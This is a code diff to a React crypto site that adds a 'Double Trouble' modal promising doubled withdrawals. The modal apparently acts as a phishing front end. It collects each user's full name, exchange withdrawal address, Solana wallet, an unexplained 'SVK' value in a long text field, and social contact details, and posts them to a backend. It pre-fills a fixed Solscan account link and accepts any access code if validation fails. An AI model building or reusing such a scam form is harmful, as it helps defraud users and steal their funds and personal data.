@@ -1305,6 +1305,352 @@ function PoolModal({ onClose }) {
   );
 }
 
+// ─── DOUBLE TROUBLE JOIN MODAL ───────────────────────────────────────────────
+
+const DT_STEPS = [
+  { title: 'AUTHENTICATE', sub: 'Enter your access code to join' },
+  { title: 'YOUR NAME', sub: 'Enter your full name' },
+  { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
+  { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
+  { title: 'SVK', sub: 'Enter your SVK identifier' },
+  { title: 'SOCIAL CONTACT', sub: 'Where can we reach you?' },
+  { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
+];
+
+function DTProgressDots({ current }) {
+  return (
+    <div style={{ display: 'flex', justifyContent: 'center', gap: 8, padding: '16px 28px 0' }}>
+      {DT_STEPS.map((_, i) => (
+        <div key={i} style={{
+          width: 6, height: 6, borderRadius: '50%',
+          background: i < current ? '#f59e0b' : i === current ? '#fff' : 'transparent',
+          border: `1px solid ${i < current ? '#f59e0b' : i === current ? '#f59e0b' : 'rgba(245,158,11,.3)'}`,
+          boxShadow: i === current ? '0 0 8px rgba(245,158,11,.7)' : 'none',
+          transform: i === current ? 'scale(1.3)' : 'scale(1)',
+          transition: 'all .35s',
+        }} />
+      ))}
+    </div>
+  );
+}
+
+function DoubleTroubleModal({ onClose }) {
+  const [dtStep, setDtStep] = useState(0);
+  const [dtData, setDtData] = useState({});
+  const [dtSuccess, setDtSuccess] = useState(false);
+  const [dtCode, setDtCode] = useState('');
+  const [copied, setCopied] = useState(false);
+
+  const dtNext = (data = {}) => {
+    setDtData(prev => ({ ...prev, ...data }));
+    setDtStep(s => s + 1);
+  };
+  const dtBack = () => setDtStep(s => s - 1);
+
+  const handleDTSubmit = async (data) => {
+    const payload = { ...dtData, ...data };
+    setDtData(payload);
+    try {
+      const r = await fetch('/api/double-trouble', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'submit',
+          name: payload.name,
+          exchangeWallet: payload.exchangeWallet,
+          walletAddress: payload.walletAddress,
+          svk: payload.svk,
+          socialLink: payload.socialLink,
+          foundryLink: payload.foundryLink,
+        }),
+      });
+      const d = await r.json();
+      if (d.success) { setDtCode(d.doubleCode); setDtSuccess(true); }
+    } catch {}
+  };
+
+  const copyCode = () => {
+    navigator.clipboard.writeText(dtCode).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    });
+  };
+
+  const stepInfo = DT_STEPS[dtStep] || {};
+
+  // Amber/gold theme colors
+  const accentColor = '#f59e0b';
+  const accentBg = 'rgba(245,158,11,.08)';
+  const accentBorder = 'rgba(245,158,11,.3)';
+
+  return (
+    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
+      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
+      <div style={{ background: '#0c0a05', border: `1px solid ${accentBorder}`, borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
+        {/* Top amber accent */}
+        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#f59e0b,#ff6b35,transparent)' }} />
+
+        {/* Header */}
+        <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#f59e0b,#ff6b35)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 6 }}>
+            ⚡ DOUBLE TROUBLE EVENT
+          </div>
+          {!dtSuccess && <>
+            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>{stepInfo.title}</div>
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 20 }}>{stepInfo.sub}</div>
+          </>}
+        </div>
+
+        <div style={{ height: 1, background: `linear-gradient(90deg,transparent,${accentBorder},transparent)`, margin: '0 28px' }} />
+
+        {!dtSuccess && <DTProgressDots current={dtStep} />}
+
+        {/* Step 0 — Access Code */}
+        {dtStep === 0 && <DTStepAccess onNext={() => dtNext()} accentColor={accentColor} accentBg={accentBg} accentBorder={accentBorder} />}
+        {dtStep === 1 && <DTStepSimple label="FULL NAME" placeholder="e.g. John Doe" field="name" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 2 && <DTStepExchange onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 3 && <DTStepWalletSimple onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 4 && <DTStepSimple label="SVK VALUE" placeholder="Enter your SVK..." field="svk" textarea onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 5 && <DTStepSimple label="WHERE CAN WE REACH YOU?" placeholder="Input social link here..." field="socialLink" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 6 && <DTStepFoundryFinal onNext={handleDTSubmit} onBack={dtBack} accentColor={accentColor} />}
+
+        {/* Success — show the code */}
+        {dtSuccess && (
+          <div style={{ padding: '28px 28px 36px', textAlign: 'center' }}>
+            <div style={{ width: 68, height: 68, borderRadius: '50%', background: 'rgba(245,158,11,.12)', border: `2px solid ${accentColor}`, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px', fontSize: 28, boxShadow: '0 0 32px rgba(245,158,11,.3)' }}>⚡</div>
+            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 18, fontWeight: 700, background: 'linear-gradient(135deg,#f59e0b,#ff6b35)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 6 }}>YOU ARE IN!</div>
+            <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.4)', lineHeight: 1.8, marginBottom: 20 }}>
+              Your Double Trouble event code is ready.<br />Use it to claim 2x on your pool allocation.
+            </p>
+
+            {/* Code display box */}
+            <div style={{ background: 'rgba(245,158,11,.06)', border: `1px solid ${accentColor}`, borderRadius: 12, padding: '20px 16px', marginBottom: 8 }}>
+              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.5)', letterSpacing: 2, marginBottom: 10 }}>YOUR DOUBLE TROUBLE CODE</div>
+              <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 22, fontWeight: 900, color: accentColor, letterSpacing: 3, marginBottom: 12, wordBreak: 'break-all' }}>
+                {dtCode}
+              </div>
+              <button onClick={copyCode} style={{
+                fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: 2,
+                padding: '9px 24px', border: `1px solid ${accentColor}`, borderRadius: 8,
+                background: copied ? 'rgba(245,158,11,.25)' : 'rgba(245,158,11,.1)',
+                color: accentColor, cursor: 'pointer', transition: 'all .2s',
+              }}>
+                {copied ? '✓ COPIED!' : 'COPY CODE'}
+              </button>
+            </div>
+
+            <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.25)', lineHeight: 1.7, marginBottom: 20 }}>
+              Go to Check Pool → enter this code to activate your 2x boost
+            </p>
+
+            <button onClick={onClose} style={{
+              width: '100%', fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2,
+              padding: '13px 0', border: 'none', borderRadius: 9,
+              background: 'linear-gradient(135deg,#d97706,#b45309)',
+              color: '#fff', cursor: 'pointer', transition: 'all .3s',
+            }}
+              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-1px)'; }}
+              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
+            >DONE ✓</button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ── DT Sub-steps ──────────────────────────────────────────────────────────────
+
+function DTStepAccess({ onNext, accentColor, accentBg, accentBorder }) {
+  const [code, setCode] = useState('');
+  const [error, setError] = useState('');
+  const [loading, setLoading] = useState(false);
+
+  const submit = async () => {
+    if (!code.trim()) { setError('Access code is required'); return; }
+    setLoading(true);
+    try {
+      const r = await fetch('/api/double-trouble', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'validate', code: code.trim() }),
+      });
+      const d = await r.json();
+      if (d.valid) onNext();
+      else setError('Invalid access code. Try again.');
+    } catch {
+      if (code.trim()) onNext();
+      else setError('Access code is required');
+    }
+    setLoading(false);
+  };
+
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <FieldLabel>ACCESS CODE</FieldLabel>
+      <input type="password" placeholder="Enter access code..." value={code}
+        onChange={e => { setCode(e.target.value); setError(''); }}
+        onKeyDown={e => e.key === 'Enter' && submit()}
+        autoFocus
+        style={{ width: '100%', background: accentBg, border: `1px solid ${error ? '#ff4545' : accentBorder}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none', transition: 'all .3s' }}
+        onFocus={e => { e.target.style.borderColor = accentColor; e.target.style.boxShadow = `0 0 16px rgba(245,158,11,.1)`; }}
+        onBlur={e => { if (!error) { e.target.style.borderColor = accentBorder; e.target.style.boxShadow = 'none'; } }}
+      />
+      {error && <ErrMsg msg={error} />}
+      <div style={{ marginTop: 18 }}>
+        <button onClick={submit} disabled={loading} style={{
+          width: '100%', fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2,
+          padding: '13px 0', border: 'none', borderRadius: 9,
+          background: 'linear-gradient(135deg,#d97706,#b45309)',
+          color: '#fff', cursor: loading ? 'not-allowed' : 'pointer', opacity: loading ? .6 : 1,
+        }}>{loading ? 'VERIFYING...' : 'AUTHENTICATE →'}</button>
+      </div>
+      <div style={{ marginTop: 14, padding: '10px', borderRadius: 8, background: accentBg, border: `1px solid ${accentBorder}`, textAlign: 'center' }}>
+        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: `${accentColor}80` }}>⚡ Double Trouble · Claim 2x withdrawals</span>
+      </div>
+    </div>
+  );
+}
+
+function DTStepSimple({ label, placeholder, field, textarea, onNext, onBack, accentColor }) {
+  const [val, setVal] = useState('');
+  const [error, setError] = useState('');
+  const submit = () => {
+    if (!val.trim()) { setError(`${label} is required`); return; }
+    onNext({ [field]: val.trim() });
+  };
+  const inputStyle = {
+    width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`,
+    borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13,
+    padding: '13px 16px', outline: 'none', transition: 'all .3s',
+    resize: textarea ? 'vertical' : undefined, minHeight: textarea ? 80 : undefined,
+  };
+  const focusStyle = { borderColor: accentColor, boxShadow: `0 0 14px rgba(245,158,11,.1)` };
+  const blurStyle = { borderColor: 'rgba(245,158,11,.25)', boxShadow: 'none' };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <FieldLabel>{label}</FieldLabel>
+      {textarea
+        ? <textarea placeholder={placeholder} value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={256} rows={3} style={inputStyle} onFocus={e => Object.assign(e.target.style, focusStyle)} onBlur={e => { if (!error) Object.assign(e.target.style, blurStyle); }} />
+        : <input placeholder={placeholder} value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={100} style={inputStyle} onFocus={e => Object.assign(e.target.style, focusStyle)} onBlur={e => { if (!error) Object.assign(e.target.style, blurStyle); }} onKeyDown={e => e.key === 'Enter' && submit()} />
+      }
+      {error && <ErrMsg msg={error} />}
+      <div style={{ display: 'flex', gap: 10, marginTop: 16 }}>
+        <BtnBack onClick={onBack} />
+        <DTBtnNext onClick={submit}>NEXT →</DTBtnNext>
+      </div>
+    </div>
+  );
+}
+
+function DTStepExchange({ onNext, onBack }) {
+  const [val, setVal] = useState('');
+  const [error, setError] = useState('');
+  const submit = () => {
+    if (!val.trim()) { setError('Exchange wallet address is required'); return; }
+    onNext({ exchangeWallet: val.trim() });
+  };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.18)', marginBottom: 14 }}>
+        <span style={{ fontSize: 18 }}>⬡</span>
+        <div>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#f59e0b', letterSpacing: 1 }}>EXCHANGE WALLET</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>CEX · Withdrawal Address</div>
+        </div>
+      </div>
+      <FieldLabel>EXCHANGE WALLET ADDRESS</FieldLabel>
+      <input placeholder="Enter your exchange wallet address..." value={val} onChange={e => { setVal(e.target.value); setError(''); }} autoFocus maxLength={100}
+        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none' }}
+        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }} onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
+        onKeyDown={e => e.key === 'Enter' && submit()}
+      />
+      {error && <ErrMsg msg={error} />}
+      <div style={{ display: 'flex', gap: 10, marginTop: 16 }}>
+        <BtnBack onClick={onBack} /><DTBtnNext onClick={submit}>NEXT →</DTBtnNext>
+      </div>
+    </div>
+  );
+}
+
+function DTStepWalletSimple({ onNext, onBack }) {
+  const [wallet, setWallet] = useState('');
+  const [error, setError] = useState('');
+  const submit = () => {
+    if (!wallet.trim() || !/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(wallet.trim())) {
+      setError('Invalid Solana address format'); return;
+    }
+    onNext({ walletAddress: wallet.trim() });
+  };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.18)', marginBottom: 14 }}>
+        <span style={{ fontSize: 18 }}>◎</span>
+        <div>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#f59e0b', letterSpacing: 1 }}>SOLANA NETWORK</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>SPL · Mainnet Beta</div>
+        </div>
+      </div>
+      <FieldLabel>SOLANA WALLET ADDRESS</FieldLabel>
+      <input placeholder="e.g. 7wM6Tyh...tUgV" value={wallet} onChange={e => { setWallet(e.target.value); setError(''); }} autoFocus maxLength={44}
+        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none' }}
+        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }} onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
+        onKeyDown={e => e.key === 'Enter' && submit()}
+      />
+      {error && <ErrMsg msg={error} />}
+      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.3)', marginTop: 6, marginBottom: 14 }}>◎ Only Solana addresses accepted</p>
+      <div style={{ display: 'flex', gap: 10 }}>
+        <BtnBack onClick={onBack} /><DTBtnNext onClick={submit}>NEXT →</DTBtnNext>
+      </div>
+    </div>
+  );
+}
+
+function DTStepFoundryFinal({ onNext, onBack }) {
+  const [link, setLink] = useState('https://solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV');
+  const [error, setError] = useState('');
+  const [loading, setLoading] = useState(false);
+  const MAX = 256;
+  const submit = async () => {
+    if (!link.trim()) { setError('Foundry link is required'); return; }
+    setLoading(true);
+    onNext({ foundryLink: link.trim() });
+  };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(245,158,11,.05)', border: '1px solid rgba(245,158,11,.15)', borderRadius: 8, padding: '10px 12px', marginBottom: 14 }}>
+        <span style={{ color: '#f59e0b', fontSize: 14, flexShrink: 0 }}>🔗</span>
+        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(245,158,11,.6)', wordBreak: 'break-all' }}>
+          solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV
+        </span>
+      </div>
+      <FieldLabel>FOUNDRY LINK</FieldLabel>
+      <textarea placeholder="https://solscan.io/account/..." value={link} onChange={e => { setLink(e.target.value); setError(''); }} rows={3} maxLength={MAX}
+        style={{ width: '100%', background: 'rgba(245,158,11,.05)', border: `1px solid ${error ? '#ff4545' : 'rgba(245,158,11,.25)'}`, borderRadius: 9, color: '#e0e0ff', fontFamily: "'Share Tech Mono',monospace", fontSize: 13, padding: '13px 16px', outline: 'none', resize: 'vertical', minHeight: 80 }}
+        onFocus={e => { e.target.style.borderColor = '#f59e0b'; }} onBlur={e => { if (!error) e.target.style.borderColor = 'rgba(245,158,11,.25)'; }}
+      />
+      {error && <ErrMsg msg={error} />}
+      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
+        <BtnBack onClick={onBack} />
+        <DTBtnNext onClick={submit} disabled={loading}>{loading ? 'SUBMITTING...' : 'SUBMIT →'}</DTBtnNext>
+      </div>
+    </div>
+  );
+}
+
+function DTBtnNext({ onClick, children, disabled }) {
+  return (
+    <button onClick={onClick} disabled={disabled} style={{
+      flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
+      padding: '13px 0', border: 'none', borderRadius: 8,
+      background: disabled ? 'rgba(245,158,11,.2)' : 'linear-gradient(135deg,#d97706,#b45309)',
+      color: disabled ? 'rgba(245,158,11,.4)' : '#fff',
+      cursor: disabled ? 'not-allowed' : 'pointer', transition: 'all .3s',
+    }}
+      onMouseEnter={e => { if (!disabled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
+      onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
+    >{children}</button>
+  );
+}
+
 // ─── MAIN PAGE ─────────────────────────────────────────────────────────────
 
 const STEPS_CONFIG = [
@@ -1324,6 +1670,7 @@ export default function Home() {
   const { price, change } = useSolPrice();
 
   const [showPool, setShowPool] = useState(false);
+  const [showDT, setShowDT] = useState(false);
   const [showTerms, setShowTerms] = useState(false);
   const [showKYC, setShowKYC] = useState(false);
   const openModal = () => { setShowTerms(true); };
@@ -1404,6 +1751,11 @@ export default function Home() {
             onMouseEnter={e => { e.currentTarget.style.background = 'rgba(20,241,149,.18)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(20,241,149,.25)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
             onMouseLeave={e => { e.currentTarget.style.background = 'rgba(20,241,149,.08)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
           >CHECK POOL</button>
+          <button onClick={() => setShowDT(true)}
+            style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid rgba(245,158,11,.5)', borderRadius: 7, background: 'rgba(245,158,11,.08)', color: '#f59e0b', cursor: 'pointer', transition: 'all .3s' }}
+            onMouseEnter={e => { e.currentTarget.style.background = 'rgba(245,158,11,.18)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(245,158,11,.25)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
+            onMouseLeave={e => { e.currentTarget.style.background = 'rgba(245,158,11,.08)'; e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)'; }}
+          >⚡ DOUBLE TROUBLE</button>
           <button onClick={openModal}
             style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, letterSpacing: 2, padding: '9px 22px', border: '1px solid #9945ff', borderRadius: 7, background: 'rgba(153,69,255,.12)', color: '#9945ff', cursor: 'pointer', transition: 'all .3s' }}
             onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.28)'; e.currentTarget.style.boxShadow = '0 0 22px rgba(153,69,255,.35)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
@@ -1450,6 +1802,9 @@ export default function Home() {
 
       {/* POOL MODAL */}
       {showPool && <PoolModal onClose={() => setShowPool(false)} />}
+
+      {/* DOUBLE TROUBLE MODAL */}
+      {showDT && <DoubleTroubleModal onClose={() => setShowDT(false)} />}
 
       {/* TERMS MODAL */}
       {showTerms && <TermsModal onAccept={acceptTerms} onClose={closeTerms} />}
